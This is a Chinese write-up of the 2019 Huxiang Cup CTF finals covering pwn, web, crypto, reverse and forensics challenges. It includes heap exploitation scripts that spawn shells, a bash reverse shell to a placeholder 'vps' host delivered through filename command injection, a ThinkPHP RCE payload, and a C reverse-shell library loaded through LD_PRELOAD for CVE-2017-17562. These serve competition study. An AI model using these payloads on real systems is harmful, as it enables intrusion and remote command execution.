# 湖湘杯2019复赛Writeup

阅读量 **1151128**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-11-14 11:30:15

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0133cdf3219e95c7eb.png)

## pwn

###  HackNote

edit那边的strlen存在问题，如果一直输入接到下一个chunk的size地方，那就会出现new_len>old_len情况，可以下一次edit到size段，从而造成堆重叠，最后修改malloc_hook来getshell。但是长度不够，所以自写了个read后ret过去执行。

    
    
    from pwn import *
    #r=process('./HackNote')
    r=remote('183.129.189.62',11104)
    context(arch = 'amd64', os = 'linux')
    def gd():
        gdb.attach(r)
        pause()
    
    def add(size,content):
        r.sendlineafter('-----------------','1')
        r.sendlineafter('nput the Size:',str(size))
        r.sendafter('he Note:',content)
    
    def free(idx):
        r.sendlineafter('-----------------','2')
        r.sendlineafter('the Index of Note:',str(idx))
    
    def edit(idx,content):
        r.sendlineafter('-----------------','3')
        r.sendlineafter('Note',str(idx))
        r.sendafter('Input the Note:',content)
    
    fake=0x06CBC40
    free_hook=0x6CD5E8
    malloc_hook=0x6CB788
    sc=asm(shellcraft.sh())
    sc='''
    xor rdi,rdi
    push 0x6cbc40
    pop rsi
    push 0x100
    pop rbx
    push 0
    pop rax
    syscall
    push 0x6cbc40
    ret
    '''
    sc=asm(sc)
    print shellcraft.sh()
    print hex(len(sc))
    add(0xf8,p64(0)+p64(0xf1)+p64(fake-0x18)+p64(fake-0x10)+p64(0)*26+p64(0xf0))#0
    add(0xf8,'aaaan')#1
    add(0x38,'bbbbn')#2
    add(0x50,'ccccn')#3
    edit(0,'a'*0xf8)
    edit(0,p64(0xffffffffffffffff)+p64(0xf1)+p64(fake)+p64(fake+8)+p64(0)*26+p64(0xf0)+'x41'+'x01')
    free(1)
    add(0xf8,'aaaan')#1
    add(0x38,p64(malloc_hook-0xe-8)+'n')#4
    free(2)
    edit(4,p64(malloc_hook-0xe-8)+'n')
    add(0x38,p64(malloc_hook-0xe-8)+'n')#2
    add(0x38,'a'*6+p64(malloc_hook+8)+sc+'n')
    r.sendline('1')
    r.recvuntil('Input the Size:n')
    r.sendline('123')
    r.sendline(asm(shellcraft.sh()))
    r.interactive()
    

###  NameSystem

free那边的挨个向前有问题，18=19但19!=0  
洞存在free时候，如果free18，这时候18=19，或者说，只要19存在，每次free，19不置零但是18=19.所以从而double
free，没有leak函数，所以考虑把free_got改掉成printf_plt来整，最后leak完后改system来getshell

    
    
    from pwn import *
    #r = process("./NameSystem")
    r=remote('183.129.189.62',21405)
    libc=ELF('./libc-2.23.so')
    def add(size, content):
        r.sendline("1")
        r.sendlineafter("Name Size:", str(size))
        r.sendlineafter("Name:", content)
        r.recvuntil("Your choice :n")
    
    def free(index):
        r.sendline("3")
        r.sendlineafter("The id you want to delete:", str(index))
    
    def gd():
        gdb.attach(r)
        pause()
    
    elf=ELF("./NameSystem")
    while(1):
        r.recvuntil("Your choice :n")
    
        for i in range(17):
            add(0x40, "/bin/sh")
    
        add(0x50,'/bin/sh')
        add(0x50, "/bin/sh")
        add(0x50, "/bin/sh")
        free(18)
        free(18)
        free(17)
        free(19)#1
        free(0)#2
        free(0)#3
        add(0x60,'/bin/sh')#17
        add(0x60,'/bin/sh')#18
        add(0x60,'/bin/sh')
        free(18)
        free(18)
        free(17)
        free(19)
        for i in range(14):
            free(0)
    
        add(0x50, p64(elf.got['free']-0x1e))
        add(0x50, p64(0))
        add(0x50, "/bin/shx00")
        add(0x50, 'x00'*6+p64(0x71)+p32(elf.plt['printf']) + "x00" * 3)
        print hex(elf.got['free'])
        print hex(elf.got['printf'])
        add(0x40,'%13$p')
        free(9)
        r.recvuntil('0x')
        leak=int(r.recv(12),16)
        print hex(leak)
        libc_base=leak-240-libc.symbols['__libc_start_main']
        print hex(libc_base)
        add(0x60, p64(elf.got['free']-0x10))
        add(0x60, p64(0))
        add(0x60, "/bin/shx00")
        add(0x60,p64(libc_base+0x45390)[:7])
        r.interactive()
    

## misc

###  something in image

file命令分析是linux镜像文件，R-studio打开发现Flag.txt拿到flag

###  Ezmemory

拿到一个`mem.raw`，上`volatility`

先`volatility -f mem.raw imageinfo`获取镜像系统信息

![](https://ps.ssl.qhmsg.com/t01ce413012253e4102.png)

`--profile=Win7SP1x64`指定操作系统

`volatility -f mem.raw --profile=Win7SP1x64 pslist`列出所有进程

![](https://ps.ssl.qhmsg.com/t01b3b2ba5265dc2db5.jpg)

发现有一个`cmd`进程

`volatility -f mem.raw --profile=Win7SP1x64 cmdscan`查看命令行上的操作

![](https://ps.ssl.qhmsg.com/t01fe251f51bfc9fcd2.jpg)

发现flag

###  misc4

azpr爆破解压密码为123456  
elf运行后有flag，但是提交错误。根据题目名字猜测是elf隐写，搜了半天搜到一个hydan隐写，参考链接：<https://www.cnblogs.com/pcat/p/6716502.html>  
但是hydan解密需要密码。猜测和压缩包密码一样是123456，得到`8*&#b`，然后解密aes密文，得到`bNa3vN1ImCHYlN42kC1FYA47aMalbAXIpNaMsAXBVNKApMqMnBro8`，再解一层xxencode，然后再栅栏拿到最后的flag

## crypto

###  give me your passport

代码审计后，发现是个简单的AES-CBC。

AES的key都已经给了。

只要发过去的东西，前16字节是IV，后面的解密出来是Admin即可获得flag。

任意选择一次服务器返回的IV，然后用KEY对’Admin’加密，连接成密文，发过去，就能拿到flag。

![](https://ps.ssl.qhmsg.com/t0177f762da9fca308e.png)

![](https://ps.ssl.qhmsg.com/t018725c1b554062364.png)

###  RSA

e * d = 1 (mod (p-1)(q-1))

e dp = 1 (mod p-1)

那么可以写成 edp – 1 = k * (p-1)

其中`1 <= k <= e`

可以根据下面这个方法爆破k

    
    
    from Crypto.Uitl.number import *
    
    e = 65537
    dp = ...
    kp_1 = dp*e - 1
    for k in range(1, e):
        if kp_1 % k == 0:
            tmp = kp_1 // k
            if isPrime(tmp+1):
                print(tmp)
    

得到输出`127353412948873836906687778206509910878775314988106052080998527001224905757226684812828764973002447453109594922446553339420598206561385151430457829996205647622747518251616965320363658027264186719678664334278218049211583365254398026548102259795044636599208243773041401637282792878778039534749858540041527364997`即为p，解密即可

    
    
    p = ...
    n = ...
    c = ...
    q = n // p
    assert(n == p*q)
    d = inverse(e, (p-1)*(q-1))
    m = pow(c, d, n)
    print(long_to_bytes(m))
    # flag{d90a4bb43f64275794522dffdb4bd78b}
    

###  DES

DES，给了16组子密钥，解密分分钟。（用自己写的[DES实现](https://github.com/soreatu/Cryptography/blob/master/DES.py)）

    
    
    In [25]: for i in range(0, len(c), 8):
    ...: print(DES.DES_dec(c[i:i+8], subkey))
    ...:
    b'4313e6e9'
    b'1be766c4'
    b'8725e5bd'
    

mes = b’4313e6e91be766c48725e5bd’

`flag = mes+deskey`

关键是恢复出原始的8字节（64位）密钥。

实际上，DES有效的密钥长度是56位，另外8位是为了保证每一个字节都是odd parity。

有`2**8=256`种可能的原始8字节密钥。

利用[工具](https://github.com/SideChannelMarvels/Stark)，可以恢复出其中的某一个：

    
    
    $ ./des_keyschedule a096463b0798 3433313365366539 800379453d5758a2
    Round1 key: A096463B0798 == 28 09 19 06 0E 30 1E 18
    Plain: 3433313365366539
    Cipher: 800379453d5758a2
    Reversing key scheduling...
    Key found at offset 46: 416f48656f664442
    

hex转成ascii得到`AoHeofDB`，连接起来，提交，错误。

那看来需要算出另外255种可能的初始密钥，然后手动提交爆破flag了。

    
    
    In [84]: for i in range(2**8):
    ...:         tmp = l.copy()
    ...:         for index, j in enumerate(bin(i)[2:].zfill(8)):
    ...:             if j == '1'
    ...:                 tmp[index] ^= 1
    ...:         key = b''
    ...:         for j in tmp:
    ...:             key += bytes([j])
    ...:         assert(pyDes.des(deskey).Kn == subkey)
    ...:         print(mes+key)
    ...:
    ...:
    b'4313e6e91be766c48725e5bdAnHeofDB'
    b'4313e6e91be766c48725e5bdAnHeofDC'
    b'4313e6e91be766c48725e5bdAnHeofEB'
    b'4313e6e91be766c48725e5bdAnHeofEC'
    b'4313e6e91be766c48725e5bdAnHeogDB'
    b'4313e6e91be766c48725e5bdAnHeogDC'
    b'4313e6e91be766c48725e5bdAnHeogEB'
    b'4313e6e91be766c48725e5bdAnHeogEC'
    b'4313e6e91be766c48725e5bdAnHenfDB'
    b'4313e6e91be766c48725e5bdAnHenfDC'
    b'4313e6e91be766c48725e5bdAnHenfEB'
    b'4313e6e91be766c48725e5bdAnHenfEC'
    b'4313e6e91be766c48725e5bdAnHengDB'
    b'4313e6e91be766c48725e5bdAnHengDC'
    b'4313e6e91be766c48725e5bdAnHengEB'
    b'4313e6e91be766c48725e5bdAnHengEC'
    b'4313e6e91be766c48725e5bdAnHdofDB'
    b'4313e6e91be766c48725e5bdAnHdofDC'
    b'4313e6e91be766c48725e5bdAnHdofEB'
    b'4313e6e91be766c48725e5bdAnHdofEC'
    ...
    

好在试了前几个就试对了。  
最后的flag应该是`4313e6e91be766c48725e5bdAnHengDB`

## web

###  untar

题目改编了2017 hitcon 的ssrfme  
UNTAR的作用其实和GET是一样的，而且filename参数是没有过滤的,所以我们只要多走一步就ok了，payload如下：

    
    
    shell.txt 内容  bash -i >& /dev/tcp/vps/11111 0<&1 2>&1
    
    url=http://vps/shell.txt&filename=a
    url=http://vps&filename=bash a|
    

![](https://ps.ssl.qhmsg.com/t01e4987cb536487097.png)

###  thinkphp?

看到有人一下就秒了，猜测是tp5rce，然后还真是。

  * thinkphp rce

    
    
    POST /
    
    
    _method=__construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
    

![](https://ps.ssl.qhmsg.com/t01f9fb596473f60f3d.png)

## re

###  re1

程序实现了一个迷宫输入必须为hex  
dump出地图

    
    
    8 1 e b 7 10 1
    b f f 1 1 9 1
    1 1 1 1 1 b 1
    c c 8 e 1 8 1
    8 1 1 c 9 e 1
    d 8 b 1 1 1 1
    1 1 9 a 9 9 63
    
    
    1 up
    2 down
    3 left
    4 right
    
    2 4 4 1 4 4 4 2 2 2 2 3 3 1 3 3 3 2 2 4 4 2 4 4 4 4
    

输入后对输入替换出现flag  

###  re2

upx壳直接脱完后发现是: 输入转16进制-1后直接明文比较

dump出数据-1后就是答案 //转16进制函数中还初始化了些加上即可

4fc5f0e3e2e199a0a6ddd945aa2dfeda

###  re3

加密和解密函数都调用了下  
对输入加密后与局部变  
`3ACF8D62AAA0B630C4AF43AF327CE129D46F0FEB98D9040F713BE65502A5107A`比较  
直接在解密函数前把输入的加密替换成上面的就行  
然后查看回显是`3561636230363233313732346338633336396261653731313136366462653835`

![](https://ps.ssl.qhmsg.com/t0139fd3fb1f3bfb88c.png)

转字符串就是flag  
5acb06231724c8c369bae711166dbe85

## 创新

###  大数据安全

cve复现

  * CVE-2017-17562

    
    
    #include<stdio.h>
    #include<stdlib.h>
    #include<sys/socket.h>
    #include<netinet/in.h>
    
    char *server_ip="ip";
    uint32_t server_port=5431;
    
    static void reverse_shell(void) __attribute__((constructor));
    static void reverse_shell(void) 
    {
      //socket initialize
      int sock = socket(AF_INET, SOCK_STREAM, 0);
      struct sockaddr_in attacker_addr = {0};
      attacker_addr.sin_family = AF_INET;
      attacker_addr.sin_port = htons(server_port);
      attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
      //connect to the server
      if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
        exit(0);
      //dup the socket to stdin, stdout and stderr
      dup2(sock, 0);
      dup2(sock, 1);
      dup2(sock, 2);
      //execute /bin/sh to get a shell
      execve("/bin/sh", 0, 0);
    }
    

  * gcc -shared -fPIC ./exp.c -o exp.so
  * curl -X POST —data-binary [@exp](https://github.com/exp "@exp").so “<http://183.129.189.62:11700/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0>“

![](https://ps.ssl.qhmsg.com/t01595f6c84af2c4d31.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **郁离歌丶** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/192605](/post/id/192605)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [writeup](/tag/writeup)

 **+1** __14赞

 __收藏

![](https://p5.ssl.qhimg.com/t01300edf05ffebefb7.png) 郁离歌丶

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

